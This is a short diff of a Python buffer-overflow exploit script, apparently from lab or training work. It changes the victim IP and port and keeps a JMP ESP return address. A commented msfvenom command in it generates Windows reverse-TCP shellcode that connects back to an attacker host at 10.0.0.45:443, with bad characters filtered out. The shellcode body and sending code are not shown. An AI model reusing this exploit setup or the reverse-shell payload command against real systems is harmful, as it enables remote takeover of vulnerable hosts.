@@ -5,8 +5,8 @@
 # 0x1480113D JMP ESP
 import socket
 
-victim = "10.0.0.53"
-port = 7002
+victim = "10.0.0.0"
+port = 9999
 
 ## msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.45 LPORT=443 -f py -b '\x00\x3b\x45' -v shellcode
 ## shellcode
